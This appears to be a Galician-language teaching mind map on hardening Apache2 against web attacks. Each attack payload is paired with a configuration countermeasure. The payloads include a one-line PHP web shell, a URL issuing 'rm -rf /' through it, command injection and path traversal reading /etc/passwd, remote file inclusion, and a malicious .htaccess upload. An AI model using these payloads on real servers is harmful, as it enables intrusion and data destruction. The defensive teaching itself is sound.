<map version="freeplane 1.7.0">
<!--To view this file, download free mind mapping software Freeplane from http://freeplane.sourceforge.net -->
<node FOLDED="false" ID="ID_1571813025" CREATED="1609149500122" MODIFIED="1643066469195" STYLE="oval"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h1>
      apache2
    </h1>
  </body>
</html>
</richcontent>
<hook NAME="MapStyle">
    <conditional_styles>
        <conditional_style ACTIVE="true" LOCALIZED_STYLE_REF="styles.connection" LAST="false">
            <node_periodic_level_condition PERIOD="2" REMAINDER="1"/>
        </conditional_style>
        <conditional_style ACTIVE="true" LOCALIZED_STYLE_REF="styles.topic" LAST="false">
            <node_level_condition VALUE="2" MATCH_CASE="false" MATCH_APPROXIMATELY="false" COMPARATION_RESULT="0" SUCCEED="true"/>
        </conditional_style>
        <conditional_style ACTIVE="true" LOCALIZED_STYLE_REF="styles.subtopic" LAST="false">
            <node_level_condition VALUE="4" MATCH_CASE="false" MATCH_APPROXIMATELY="false" COMPARATION_RESULT="0" SUCCEED="true"/>
        </conditional_style>
        <conditional_style ACTIVE="true" LOCALIZED_STYLE_REF="styles.subsubtopic" LAST="false">
            <node_level_condition VALUE="6" MATCH_CASE="false" MATCH_APPROXIMATELY="false" COMPARATION_RESULT="0" SUCCEED="true"/>
        </conditional_style>
    </conditional_styles>
    <properties edgeColorConfiguration="#808080ff,#ff0000ff,#0000ffff,#00ff00ff,#ff00ffff,#00ffffff,#7c0000ff,#00007cff,#007c00ff,#7c007cff,#007c7cff,#7c7c00ff" show_icon_for_attributes="true" fit_to_viewport="false"/>

<map_styles>
<stylenode LOCALIZED_TEXT="styles.root_node" STYLE="oval" UNIFORM_SHAPE="true" VGAP_QUANTITY="24.0 pt">
<font SIZE="24"/>
<stylenode LOCALIZED_TEXT="styles.predefined" POSITION="right" STYLE="bubble">
<stylenode LOCALIZED_TEXT="default" ICON_SIZE="12.0 pt" COLOR="#000000" STYLE="fork">
<font NAME="Arial" SIZE="10" BOLD="false" ITALIC="false"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.details"/>
<stylenode LOCALIZED_TEXT="defaultstyle.attributes">
<font SIZE="9"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.note" COLOR="#000000" BACKGROUND_COLOR="#ffffff" TEXT_ALIGN="LEFT"/>
<stylenode LOCALIZED_TEXT="defaultstyle.floating">
<edge STYLE="hide_edge"/>
<cloud COLOR="#f0f0f0" SHAPE="ROUND_RECT"/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.user-defined" POSITION="right" STYLE="bubble">
<stylenode LOCALIZED_TEXT="styles.topic" COLOR="#18898b" STYLE="fork">
<font NAME="Liberation Sans" SIZE="10" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.subtopic" COLOR="#cc3300" STYLE="fork">
<font NAME="Liberation Sans" SIZE="10" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.subsubtopic" COLOR="#669900">
<font NAME="Liberation Sans" SIZE="10" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.connection" COLOR="#606060" STYLE="fork">
<font NAME="Arial" SIZE="8" BOLD="false"/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.AutomaticLayout" POSITION="right" STYLE="bubble">
<stylenode LOCALIZED_TEXT="AutomaticLayout.level.root" COLOR="#000000" STYLE="oval">
<font SIZE="18"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,1" COLOR="#0033ff">
<font SIZE="16"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,2" COLOR="#00b439">
<font SIZE="14"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,3" COLOR="#990000">
<font SIZE="12"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,4" COLOR="#111111">
<font SIZE="10"/>
</stylenode>
</stylenode>
</stylenode>
</map_styles>
</hook>
<node TEXT="" POSITION="right" ID="ID_683021497" CREATED="1609149733076" MODIFIED="1609149733077">
<hook NAME="FirstGroupNode"/>
</node>
<node LOCALIZED_STYLE_REF="AutomaticLayout.level.root" POSITION="right" ID="ID_1460948984" CREATED="1609149624276" MODIFIED="1614550676806"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h2>
      .php$
    </h2>
  </body>
</html>
</richcontent>
</node>
<node TEXT="" POSITION="right" ID="ID_1527386879" CREATED="1609149733073" MODIFIED="1614551184488">
<hook NAME="SummaryNode"/>
<hook NAME="AlwaysUnfoldedNode"/>
<node ID="ID_1007139708" CREATED="1609149733078" MODIFIED="1643068503093"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h3>
      Impedir execuci&#243;n != .php<br/>(php2, php3, php4, phps, phtml, phar...)
    </h3>
  </body>
</html>

</richcontent>
<node ID="ID_1072443201" CREATED="1614551059747" MODIFIED="1643062404938"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      File Upload
    </h4>
  </body>
</html>

</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_1944042551" CREATED="1614551324025" MODIFIED="1643063665556"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px">
      <font size="3">&lt;?php<br size="3"/>&#160;&#160;&#160;&#160;system($_GET['command']);<br size="3"/>?&gt;</font>
    </div>
  </body>
</html>

</richcontent>
</node>
<node ID="ID_237333079" CREATED="1614551158089" MODIFIED="1643068566390"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="480px" style="color: green">
    <h4>
      Contramedida1 (expresi&#243;ns regulares):<br/>
    </h4>
    <div style="margin-left: 20px">
      &lt;FilesMatch '\.php$'&gt;<br/>&#160;&#160;&#160;&#160;SetHandler application/x-httpd-php<br/>&lt;/FilesMatch&gt;<br/><br/>&lt;FilesMatch '(\.php.$|\.phtml$)'&gt;<br/>&#160;&#160;&#160;&#160;&#160;SetHandler application/x-httpd-php-source<br/>&lt;/FilesMatch&gt;
    </div>
    <h4>
      Contramedida2 (.htaccess):<br/>
    </h4>
    <div style="margin-left: 20px">
      RemoveHandler .php2 .php3 .php4 .php5 .php6 .php7 .php8 .phtml .phar<br/>RemoveType .php2 .php3 .php4 .php5 .php6 .php7 .php8 .phtml .phar<br/>Options -ExecCGI<br/>AddHandler cgi-script .php2 .php3 .php4 .php5 .php6 .php7 .php8 .phtml .phar
    </div>
    <br/>
  </body>
</html>

</richcontent>
<font SIZE="12"/>
</node>
</node>
</node>
</node>
<node TEXT="" POSITION="right" ID="ID_1523267089" CREATED="1609149733076" MODIFIED="1609149733077">
<hook NAME="FirstGroupNode"/>
</node>
<node LOCALIZED_STYLE_REF="AutomaticLayout.level.root" POSITION="right" ID="ID_1205809235" CREATED="1609149624276" MODIFIED="1614550951120"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h2>
      user.group
    </h2>
  </body>
</html>
</richcontent>
</node>
<node TEXT="" POSITION="right" ID="ID_360585062" CREATED="1609149733073" MODIFIED="1609149733075">
<hook NAME="SummaryNode"/>
<hook NAME="AlwaysUnfoldedNode"/>
<node ID="ID_516761705" CREATED="1609149733078" MODIFIED="1614553965956"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="100%">
    <h3>
      Permisos DocumentRoot != root
    </h3>
  </body>
</html>
</richcontent>
<node TEXT="" ID="ID_136230001" CREATED="1614553979174" MODIFIED="1614553979174">
<node LOCALIZED_STYLE_REF="styles.connection" ID="ID_1734377622" CREATED="1614551059747" MODIFIED="1614554378218"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      chown/chmod
    </h4>
  </body>
</html>
</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_865274498" CREATED="1614551324025" MODIFIED="1643064477109"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="380px">
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px">
      <font size="3"># chown -R root. /var/www/html<br size="3"/># find /var/www/html -exec chmod 777 {} \;<br/>Payload File Upload -&gt; Executar comando: rm -rf /&#160;&#160;&#160; http://IP?command=rm%20-rf%20/</font>
    </div>
  </body>
</html>

</richcontent>
</node>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_1042623444" CREATED="1614551158089" MODIFIED="1614714220676"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="320px" style="color: green">
    <h4>
      Contramedida:<br/>
    </h4>
    <div style="margin-left: 20px">
      # chown -R www-data. /var/www/html<br/># find /var/www/html -type f -exec chmod 400 {} \;<br/># find /var/www/html -type d -exec chmod 500 {} \; #&#160;echo /usr/sbin/nologin | chsh www-data
    </div>
  </body>
</html>
</richcontent>
<font SIZE="12"/>
</node>
</node>
</node>
</node>
</node>
<node LOCALIZED_STYLE_REF="AutomaticLayout.level.root" POSITION="right" ID="ID_1630883189" CREATED="1609149624276" MODIFIED="1614555401269"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h2>
      info/version
    </h2>
  </body>
</html>
</richcontent>
<node ID="ID_1482062920" CREATED="1609149733078" MODIFIED="1614711085026"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h3>
      Non amosar info/version apache
    </h3>
  </body>
</html>
</richcontent>
<node LOCALIZED_STYLE_REF="styles.connection" ID="ID_1898723423" CREATED="1614551059747" MODIFIED="1643067797609"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      apache2 -&gt; conf -&gt; security.conf
    </h4>
  </body>
</html>

</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_706144083" CREATED="1614551324025" MODIFIED="1643068256136"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="380px">
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px">
      <font size="3">URL err&#243;nea -&gt; http://IP/dlkfsk -&gt; 404</font>
    </div>
  </body>
</html>

</richcontent>
</node>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_29724177" CREATED="1614551158089" MODIFIED="1643067961551"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="320px" style="color: green">
    <h4>
      Contramedida:<br/>
    </h4>
    <div style="margin-left: 20px">
      Edit security.conf:<br/>&#160;&#160;ServerTokens Prod<br/>&#160;&#160;ServerSignature Off<br/><br/># a2enconf security &amp;&amp; /etc/init.d/apache2 reload
    </div>
  </body>
</html>

</richcontent>
<font SIZE="12"/>
</node>
</node>
</node>
<node ID="ID_1736450946" CREATED="1609149733078" MODIFIED="1614711119085"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h3>
      Non amosar info/version php
    </h3>
  </body>
</html>
</richcontent>
<node LOCALIZED_STYLE_REF="styles.connection" ID="ID_964655609" CREATED="1614551059747" MODIFIED="1614713238448"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      apache2/php.ini
    </h4>
  </body>
</html>

</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_1648847741" CREATED="1614551324025" MODIFIED="1614711455171"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="380px">
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px">
      <font size="3">HTTP Header -&gt; Inspeccionar elememento (Developer Web) </font>
    </div>
  </body>
</html>
</richcontent>
</node>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_146705087" CREATED="1614551158089" MODIFIED="1614711396730"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="320px" style="color: green">
    <h4>
      Contramedida:<br/>
    </h4>
    <div style="margin-left: 20px">
      expose_php=off
    </div>
  </body>
</html>
</richcontent>
<font SIZE="12"/>
</node>
</node>
</node>
</node>
<node LOCALIZED_STYLE_REF="AutomaticLayout.level.root" POSITION="right" ID="ID_1928727470" CREATED="1609149624276" MODIFIED="1614603724060"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h2>
      listar contido directorios
    </h2>
  </body>
</html>
</richcontent>
<node ID="ID_131976102" CREATED="1609149733078" MODIFIED="1614603777698"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h3>
      Non amosar contido directorios
    </h3>
  </body>
</html>
</richcontent>
<node LOCALIZED_STYLE_REF="styles.connection" ID="ID_1152009817" CREATED="1614551059747" MODIFIED="1614603786578"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      Options
    </h4>
  </body>
</html>
</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_351000303" CREATED="1614551324025" MODIFIED="1614603825481"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="380px">
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px">
      <font size="3">Options +Indexes</font>
    </div>
  </body>
</html>
</richcontent>
</node>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_1638453204" CREATED="1614551158089" MODIFIED="1614603841652"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="320px" style="color: green">
    <h4>
      Contramedida:<br/>
    </h4>
    <div style="margin-left: 20px">
      Options -Indexes
    </div>
  </body>
</html>
</richcontent>
<font SIZE="12"/>
</node>
</node>
</node>
</node>
<node LOCALIZED_STYLE_REF="AutomaticLayout.level.root" POSITION="right" ID="ID_316568426" CREATED="1609149624276" MODIFIED="1614603921539"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h2>
      restricci&#243;n&#160;&#160;de acceso
    </h2>
  </body>
</html>
</richcontent>
<node ID="ID_58551616" CREATED="1609149733078" MODIFIED="1614611625125"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h3>
      HTTP BASIC + HTTPS
    </h3>
  </body>
</html>
</richcontent>
<node LOCALIZED_STYLE_REF="styles.connection" ID="ID_460990030" CREATED="1614551059747" MODIFIED="1614611335031"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      HTTP Basic
    </h4>
  </body>
</html>
</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_179663310" CREATED="1614551324025" MODIFIED="1614611801877"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="380px">
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px">
      <font size="3">Sniffer/Proxy</font>
    </div>
  </body>
</html>
</richcontent>
</node>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_1792772976" CREATED="1614551158089" MODIFIED="1643062798738"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="320px" style="color: green">
    <h4>
      Contramedida:<br/>
    </h4>
    <div style="margin-left: 20px">
      HTTPS (443)<br/>&#160;&#160;&#160;&#160;# a2enmod ssl &amp;&amp; /etc/init.d/apache2 restart
    </div>
  </body>
</html>

</richcontent>
<font SIZE="12"/>
</node>
</node>
</node>
</node>
<node LOCALIZED_STYLE_REF="AutomaticLayout.level.root" POSITION="right" ID="ID_1151932643" CREATED="1614611150302" MODIFIED="1614611937767"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h2>
      directivas personalizadas
    </h2>
  </body>
</html>
</richcontent>
<node ID="ID_761152238" CREATED="1609149733078" MODIFIED="1614611951617"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h3>
      Ficheiros .htaccess
    </h3>
  </body>
</html>
</richcontent>
<node LOCALIZED_STYLE_REF="styles.connection" ID="ID_1129726066" CREATED="1614551059747" MODIFIED="1614611962229"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      Directory
    </h4>
  </body>
</html>
</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_337769826" CREATED="1614551324025" MODIFIED="1614733698212"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="380px">
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px">
      <font size="3">Upload file -&gt; .htaccess<br/>&lt;FilesMatch '.jpg'&gt;<br/>&#160;&#160;&#160;&#160;SetHandler application/x-httpd-php<br/>&lt;/FilesMatch&gt; </font>
    </div>
  </body>
</html>
</richcontent>
</node>
<node ID="ID_1822518057" CREATED="1614551158089" MODIFIED="1614722799876"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body width="460px" style="color: green">
    <h4>
      Contramedida-&gt; Impedir .htaccess:<br/>
    </h4>
    <div style="margin-left: 20px">
      &lt;FilesMatch '^.ht'&gt;<br/>&#160;&#160;&#160;&#160;Require all denied<br/>&lt;/FilesMatch&gt;
    </div>
  </body>
</html>
</richcontent>
<font SIZE="12"/>
</node>
</node>
</node>
</node>
<node TEXT="" POSITION="left" ID="ID_1082852065" CREATED="1609149733076" MODIFIED="1609149733077">
<hook NAME="FirstGroupNode"/>
</node>
<node LOCALIZED_STYLE_REF="AutomaticLayout.level.root" POSITION="left" ID="ID_683063638" CREATED="1609149624276" MODIFIED="1643062274389"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h2 style="text-align: center">
      WAF<br/>ModSecurity
    </h2>
  </body>
</html>

</richcontent>
<font SIZE="18"/>
</node>
<node TEXT="" POSITION="left" ID="ID_714481050" CREATED="1609149733073" MODIFIED="1614551184488">
<hook NAME="SummaryNode"/>
<hook NAME="AlwaysUnfoldedNode"/>
<node ID="ID_436224295" CREATED="1609149733078" MODIFIED="1643062343588"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h3 style="text-align: center">
      Regras CRS<br/>(OWASP)
    </h3>
  </body>
</html>

</richcontent>
<node TEXT="" ID="ID_1594942939" CREATED="1643064876269" MODIFIED="1643064876270">
<hook NAME="FirstGroupNode"/>
</node>
<node ID="ID_1766883417" CREATED="1614551059747" MODIFIED="1643062472675"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      Command Injection
    </h4>
  </body>
</html>

</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_1110791033" CREATED="1614551324025" MODIFIED="1643067473022"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px; width: 352px">
      <font size="3">URL command execution -&gt; http://IP/text;cat /etc/passwd</font>
    </div>
  </body>
</html>

</richcontent>
</node>
</node>
<node ID="ID_863769402" CREATED="1614551059747" MODIFIED="1643062564617"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      Directory Transversal
    </h4>
  </body>
</html>

</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_1485908101" CREATED="1614551324025" MODIFIED="1643067340045"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px; width: 364px">
      <font size="3">LFI -&gt; URL directory jump -&gt; http://IP/text/../../../../etc/passwd</font>
    </div>
  </body>
</html>

</richcontent>
</node>
</node>
<node ID="ID_532367800" CREATED="1614551059747" MODIFIED="1643062448885"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      File Include
    </h4>
  </body>
</html>

</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_965811452" CREATED="1614551324025" MODIFIED="1643067253788"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px; width: 420px">
      <font size="3">LFI -&gt; URL File Include -&gt; http://IP/file.php?page=abc.php<br size="3"/>RFI -&gt; URL File Include -&gt; http://IP/file.php?page=https://domain.com</font>
    </div>
  </body>
</html>

</richcontent>
</node>
</node>
<node ID="ID_114871764" CREATED="1614551059747" MODIFIED="1643062579073"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      File Upload
    </h4>
  </body>
</html>

</richcontent>
<node LOCALIZED_STYLE_REF="styles.subtopic" ID="ID_1614014593" CREATED="1614551324025" MODIFIED="1643063856157"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      Payload:<br/>
    </h4>
    <div style="margin-left: 20px">
      <font size="3">Upload File php<br/>&lt;?php<br size="3"/>&#160;&#160;&#160;&#160;system($_GET['command']);<br size="3"/>?&gt;</font>
    </div>
  </body>
</html>

</richcontent>
</node>
</node>
<node ID="ID_71407311" CREATED="1614551059747" MODIFIED="1643064329959"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      SQLi
    </h4>
  </body>
</html>

</richcontent>
<node TEXT="" ID="ID_1796710470" CREATED="1643064836225" MODIFIED="1643064836225"/>
</node>
<node ID="ID_1669527259" CREATED="1614551059747" MODIFIED="1643064352316"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      XSS
    </h4>
  </body>
</html>

</richcontent>
<node TEXT="" ID="ID_1447837809" CREATED="1643064839508" MODIFIED="1643064839508"/>
</node>
<node ID="ID_1789450559" CREATED="1614551059747" MODIFIED="1643064406184"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      CSRF
    </h4>
  </body>
</html>

</richcontent>
<node TEXT="" ID="ID_365412727" CREATED="1643064841590" MODIFIED="1643064841590"/>
</node>
<node ID="ID_740129314" CREATED="1614551059747" MODIFIED="1643064396814"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <h4>
      ...
    </h4>
  </body>
</html>

</richcontent>
<node TEXT="" ID="ID_20433441" CREATED="1643064844366" MODIFIED="1643064844366"/>
</node>
<node TEXT="" ID="ID_1610371548" CREATED="1643064876266" MODIFIED="1643064876269">
<hook NAME="SummaryNode"/>
<hook NAME="AlwaysUnfoldedNode"/>
<node ID="ID_649787960" CREATED="1643064876271" MODIFIED="1643066780888"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body style="width: 680px; color: green">
    <p>
      Contramedida:
    </p>
    <p>
      <br/>
      
    </p>
    <div style="margin-left: 20px">
      # apt -y install libapache2-mod-security2<br/># mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf<br/># sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf<br/># sed -i 's/SecAuditLogParts ABDEFHIJZ/SecAuditLogParts ABEFHIJKZ/' /etc/modsecurity/modsecurity.conf<br/># a2enmod security2 &amp;&amp; /etc/init.d/apache2 restart<br/># tail -f /var/log/apache2/modsec_audit.log
    </div>
  </body>
</html>

</richcontent>
<font SIZE="12"/>
</node>
</node>
</node>
</node>
<node LOCALIZED_STYLE_REF="defaultstyle.floating" POSITION="left" ID="ID_763000822" CREATED="1643065767249" MODIFIED="1643066502204" HGAP_QUANTITY="10.250000111758705 pt" VSHIFT_QUANTITY="25.4999992400408 pt"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body style="width: 600px">
    <div>
      <div class="nome">
        Ricardo Feijoo Costa
      </div>
      <div class=".imgccbysa">
        <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" style="border-top-width: 0; border-right-width: 0; border-bottom-width: 0; border-left-width: 0"/>
        </a><br/>
        This work is licensed under a <a href="http://creativecommons.org/licenses/by-sa/4.0/" style="display: inline">Creative Commons Attribution-ShareAlike 4.0 International License</a>
      </div>
    </div>
    <br/>
    

    <p style="text-align: justify">
      LIMITACI&#211;N&#160;DE RESPONSABILIDADE: O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa informaci&#243;n exposta no mesmo. Por tanto, non se fai responsable en ning&#250;n caso, nin pode ser considerado legalmente responsable en ning&#250;n caso,&#160;das consecuencias que poidan derivarse da informaci&#243;n contida nel ou que est&#233; enlazada dende ou hacia el, inclu&#237;ndo os posibles erros e informaci&#243;n incorrecta existentes, informaci&#243;n difamatoria, as&#237; como das consecuencias que se poidan derivar sobre a s&#250;a aplicaci&#243;n en sistemas de informaci&#243;n reais e/ou virtuais.<br/>Este documento foi xerado para uso did&#225;ctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.
    </p>
    <p>
      
    </p>
    <p>
      <font color="#3333ff" size="4">Data: 2022-01-25</font>
    </p>
  </body>
</html>

</richcontent>
</node>
</node>
</map>
